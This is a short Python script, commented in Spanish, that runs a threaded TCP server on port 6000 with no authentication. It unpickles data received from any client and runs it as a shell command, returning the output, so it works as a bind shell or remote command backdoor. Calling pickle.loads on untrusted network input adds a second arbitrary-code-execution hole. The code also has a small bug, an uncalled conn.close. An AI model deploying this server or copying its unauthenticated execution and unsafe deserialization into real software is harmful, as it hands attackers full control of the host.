#!/usr/bin/python3
import socket
import subprocess
import threading
import sys
import pickle


ADDRESS = socket.gethostname()
PORT = 6000
FORMAT = 'utf-8'
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind((ADDRESS, PORT))


# Conexion con el cliente
def connect_to_client(conn, address):
    print(f'CONNECTION to host {address} SUCCESFUL')
    
    while True:
        message = ''
        data = conn.recv(4096)

        if data == b'exit':
            conn.close
            sys.exit(0)

        if not data: 
            break

        message += pickle.loads(data)
        out = subprocess.run(message.split(), capture_output=True)
        exit = bool(out.returncode)

        if exit == False:
            conn.send(bytes((out.stdout.decode(FORMAT)),FORMAT))
        else:
            conn.send(out.stderr)

# Iniciamos el servidor   
def runServer():
    serverSocket.listen()
    while True:
        conn, addr = serverSocket.accept()
        th = threading.Thread(target=connect_to_client, args=(conn,addr))
        th.start()


runServer()

